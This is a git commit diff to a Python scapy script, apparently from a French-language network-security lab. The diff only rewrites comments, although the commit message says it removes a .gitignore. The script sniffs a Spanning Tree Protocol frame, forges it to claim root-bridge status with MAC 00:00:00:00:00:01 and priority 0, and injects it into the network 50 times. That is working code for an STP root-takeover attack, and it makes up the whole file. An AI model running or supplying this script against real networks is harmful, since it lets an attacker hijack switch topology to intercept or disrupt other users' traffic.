f492398b6a9788971c5233a464d2172555bf7ad4
clemence6565217 <clemence.charles@outlook.be>
2023-12-19 08:45:26 +0100

    Remove .gitignore

--- STP/stp.py
+++ STP/stp.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 #Importation de toutes les fonctionnalités de la bibliothèque scapy
 from scapy.all import *
-#Utilise la fonction (sniff) pour capturer une trame STP avec une adresse de destination de multidiffusion (01:80:c2:00:00:00)
+#Utilisation de la fonction "sniff" pour capturer une trame STP avec une adresse de destination de multidiffusion (01:80:c2:00:00:00)
 frame = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
 #Changement de l'adresse MAC source de la trame en "00:00:00:00:00:01"
 frame[0].src="00:00:00:00:00:01"
@@ -13,11 +13,13 @@ frame[0].rootmac="00:00:00:00:00:01"
 frame[0].bridgeid=0
 #Modification de l'adresse MAC du pont (bridgemac) à "00:00:00:00:00:01"
 frame[0].bridgemac="00:00:00:00:00:01"
-#Affiche la
+#Utilisation de la fonction "show" afin d'afficher les détails de la trame modifiée
 frame[0].show()
-#Loop to send multiple frames into the network:
+#Utilisation d'une boucle "for" afin d'envoyer la trame modifiée dans le réseau 50 fois
 for i in range (0, 50):
-    #Send changed frame back into the network:
+    #Utilisation de la fonction "sendp" afin d'envoyer la trame
+    #La commande "loop=0" indique de ne pas envoyer la trame en boucle
+    #La commande "verbose=1" indique d'afficher des informations détaillées lors l'envoi.
     sendp(frame[0], loop=0, verbose=1)
-    #Sleep / wait for one second:
+    #Permet d'attendre 1 seconde avant de ré-envoyer la trame
     time.sleep(1)
